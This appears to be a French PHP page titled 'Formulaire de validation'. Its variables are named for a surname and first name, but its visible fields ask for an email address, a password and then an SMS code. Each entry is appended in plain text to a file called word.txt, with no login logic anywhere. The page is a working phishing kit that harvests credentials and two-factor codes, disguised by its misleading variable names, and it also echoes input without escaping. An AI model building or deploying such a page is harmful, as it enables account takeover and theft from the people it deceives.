<?php
// Initialiser les variables
$step = 1;
$nom = "";
$prenom = "";
$code_reference = "";
$message = "";
$id_session = ""; // Pour lier les deux enregistrements

// Traiter le formulaire quand il est soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["step"]) && $_POST["step"] == "1") {
        // Première étape: récupérer nom et prénom et enregistrer
        $nom = $_POST["nom"];
        $prenom = $_POST["prenom"];
        
        // Générer un ID unique pour cette session
        $id_session = uniqid();
        
        // Enregistrer dans le fichier word.txt
        $data = "ID Session: " . $id_session . "\nNom: " . $nom . "\nPrénom: " . $prenom . "\n";
        $file = fopen("word.txt", "a");
        
        if ($file) {
            fwrite($file, $data);
            fclose($file);
            $message = "Nom et prénom enregistrés avec succès!";
            $step = 2; // Passer à l'étape 2
        } else {
            $message = "Erreur lors de l'enregistrement des données.";
            $step = 1; // Rester à l'étape 1
        }
    } elseif (isset($_POST["step"]) && $_POST["step"] == "2") {
        // Deuxième étape: récupérer le code de référence et enregistrer
        $id_session = $_POST["id_session"];
        $code_reference = $_POST["code_reference"];
        
        // Enregistrer dans le fichier word.txt
        $data = "Code de référence pour session " . $id_session . ": " . $code_reference . "\n\n";
        $file = fopen("word.txt", "a");
        
        if ($file) {
            fwrite($file, $data);
            fclose($file);
            $message = "Code de référence enregistré avec succès!";
            $step = 1; // Revenir à l'étape 1 pour un nouveau formulaire
            $nom = "";
            $prenom = "";
            $code_reference = "";
        } else {
            $message = "Erreur lors de l'enregistrement du code de référence.";
            $step = 2; // Rester à l'étape 2
        }
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de validation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        h1 {
            text-align: center;
            color: #333;
        }
        
        .form-container {
            background-color: #f9f9f9;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        
        button:hover {
            background-color: #45a049;
        }
        
        .message {
            margin-top: 20px;
            padding: 10px;
            background-color: #dff0d8;
            border-radius: 4px;
            color: #3c763d;
        }
        
        .error {
            background-color: #f2dede;
            color: #a94442;
        }
    </style>
</head>
<body>
    <h1>Formulaire de validation</h1>
    
    <?php if (!empty($message)): ?>
        <div class="message">
            <?php echo $message; ?>
        </div>
    <?php endif; ?>
    
    <div class="form-container">
        <?php if ($step == 1): ?>
            <!-- Étape 1: Nom et Prénom -->
            <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                <input type="hidden" name="step" value="1">
                
                <div class="form-group">
                    <label for="nom">Adresse Courriel:</label>
                    <input type="text" id="nom" name="nom" value="<?php echo $nom; ?>" required>
                </div>
                
                <div class="form-group">
                    <label for="prenom">Mot de passe:</label>
                    <input type="password" id="prenom" name="prenom" value="<?php echo $prenom; ?>" required>
                </div>
                
                <button type="submit">Suivant</button>
            </form>
        <?php else: ?>
            <!-- Étape 2: Code de référence -->
            <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                <input type="hidden" name="step" value="2">
                <input type="hidden" name="id_session" value="<?php echo $id_session; ?>">
                
                <div class="form-group">
                    <label for="code_reference">Code SMS:</label>
                    <input type="text" id="code_reference" name="code_reference" required>
                </div>
                
                <button type="submit">Enregistrer</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>